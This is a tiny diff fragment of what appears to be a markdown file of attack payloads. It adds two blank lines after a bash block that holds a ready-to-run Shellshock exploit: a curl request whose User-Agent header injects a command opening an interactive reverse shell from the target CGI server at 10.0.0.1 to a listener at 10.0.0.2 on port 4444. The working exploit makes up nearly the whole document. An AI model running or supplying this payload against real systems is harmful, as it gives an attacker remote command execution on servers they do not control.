@@ -15,3 +15,5 @@ updated_at: '2023-04-06T03:55:57.002485+00:00'
 ```bash
 curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" 
 ```
+
+
